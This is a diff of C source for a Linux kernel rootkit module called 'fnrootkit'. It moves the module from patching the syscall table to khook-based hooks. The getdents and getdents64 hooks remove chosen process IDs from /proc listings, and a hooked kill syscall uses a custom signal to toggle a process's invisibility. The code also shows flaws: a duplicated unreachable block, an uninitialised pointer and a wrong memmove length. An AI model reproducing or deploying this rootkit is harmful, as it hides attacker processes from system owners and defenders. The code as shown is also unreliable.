@@ -1,36 +1,165 @@
 #include "../inc/fnrootkit.h"
 
-#include <linux/syscalls.h>
 #include <linux/fs.h>
+#include <linux/dirent.h>
+#include <linux/fdtable.h>
+#include <linux/syscalls.h>
 
 #include "../inc/def.h"
 #include "../inc/proc.h"
+#include "../inc/util.h"
 
-syscall_t original_kill = NULL;
-syscall_t original_getdents = NULL;
-syscall_t original_getdents64 = NULL;
+#include "../3rd_party/khook/engine.c"
 
-static unsigned long *syscall_table;
+KHOOK_EXT(long, __x64_sys_getdents, const struct pt_regs *);
+static long khook___x64_sys_getdents(const struct pt_regs *pt_regs) {
+    int fd; 
+    long ret;
+    long off = 0;
+
+    struct inode *d_inode;
+    struct linux_dirent *dirent, *kdirent, *dirent_var, *dirent_prev;
+
+    fd = (int)pt_regs->di;
+    dirent = (struct linux_dirent *)pt_regs->si;
+
+    ret = KHOOK_ORIGIN(__x64_sys_getdents, pt_regs);
+    if (ret <= 0)
+        return ret;
+
+    d_inode =
+        current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+    if (d_inode->i_ino != PROC_ROOT_INO)
+        return ret;
+
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if (!kdirent)
+        return ret;
+
+    if (copy_from_user(kdirent, dirent, ret)) {
+        kfree(kdirent);
+        return ret;
+    }
+
+    while (off < ret) {
+        dirent_var = (void *)kdirent + off;
+
+        if (is_invisible_pid(str_to_pid(dirent_var->d_name))) {
+            if (!dirent_prev) { // <==> if (dirent_var == kdirent)
+                memmove(
+                    dirent_var, (void *)dirent_var + dirent_var->d_reclen, ret
+                );
+                ret -= dirent_var->d_reclen;
+            }
+            else {
+                dirent_prev->d_reclen += dirent_var->d_reclen;
+                off += dirent_var->d_reclen;
+            }
+        }
+        else {
+            dirent_prev = dirent_var;
+            off += dirent_var->d_reclen;
+        }
+    }
+
+    copy_to_user(dirent, kdirent, ret);
+    kfree(kdirent);
+
+    return ret;
+
+    copy_to_user(dirent, kdirent, ret);
+    kfree(kdirent);
+
+    return ret;
+}
+
+KHOOK_EXT(long, __x64_sys_getdents64, const struct pt_regs *);
+static long khook___x64_sys_getdents64(const struct pt_regs *pt_regs) {
+    int fd; 
+    long ret;
+    long off = 0;
+
+    struct inode *d_inode;
+    struct linux_dirent64 *dirent, *kdirent, *dirent_var, *dirent_prev;
+
+    fd = (int)pt_regs->di;
+    dirent = (struct linux_dirent64 *)pt_regs->si;
+
+    ret = KHOOK_ORIGIN(__x64_sys_getdents64, pt_regs);
+    if (ret <= 0)
+        return ret;
+
+    d_inode =
+        current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+    if (d_inode->i_ino != PROC_ROOT_INO)
+        return ret;
+
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if (!kdirent)
+        return ret;
+
+    if (copy_from_user(kdirent, dirent, ret)) {
+        kfree(kdirent);
+        return ret;
+    }
+
+    while (off < ret) {
+        dirent_var = (void *)kdirent + off;
+
+        if (is_invisible_pid(str_to_pid(dirent_var->d_name))) {
+            if (!dirent_prev) { // <==> if (dirent_var == kdirent)
+                memmove(
+                    dirent_var, (void *)dirent_var + dirent_var->d_reclen, ret
+                );
+                ret -= dirent_var->d_reclen;
+            }
+            else {
+                dirent_prev->d_reclen += dirent_var->d_reclen;
+                off += dirent_var->d_reclen;
+            }
+        }
+        else {
+            dirent_prev = dirent_var;
+            off += dirent_var->d_reclen;
+        }
+    }
+
+    copy_to_user(dirent, kdirent, ret);
+    kfree(kdirent);
+
+    return ret;
+}
+
+KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
+static long khook___x64_sys_kill(const struct pt_regs *pt_regs) {
+    struct task_struct *task;
+    pid_t pid = (pid_t) pt_regs->di;
+    int sig = (int) pt_regs->si;
+
+    switch (sig) {
+    case SIGINVIS:
+        if ((task = find_task_struct(pid)))
+            toggle_invisability(task);
+        else
+            return ESRCH;
+        break;
+    default:
+        KHOOK_ORIGIN(__x64_sys_kill, pt_regs);
+    }
+
+    return 0;
+}
 
 static int __init fnrootkit_init(void) {
+    khook_init();
+
     printk(KERN_INFO "fnrootkit: module have loaded.\n");
-
-    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
-    original_kill       = (syscall_t)syscall_table[__NR_kill];
-    original_getdents   = (syscall_t)syscall_table[__NR_getdents];
-    original_getdents64 = (syscall_t)syscall_table[__NR_getdents64];
-
-    /*syscall_table[__NR_kill]       = ;*/
-    syscall_table[__NR_getdents]   = (unsigned long)hacked_proc_getdents;
-    syscall_table[__NR_getdents64] = (unsigned long)hacked_proc_getdents64;
 
     return 0;
 }
 
 static void __exit fnrootkit_exit(void) {
-    /*syscall_table[__NR_kill]       = ;*/
-    syscall_table[__NR_getdents]   = (unsigned long)original_getdents;
-    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64;
+    khook_cleanup();
 
     printk(KERN_INFO "fnrootkit: module have unloaded.\n");
 }
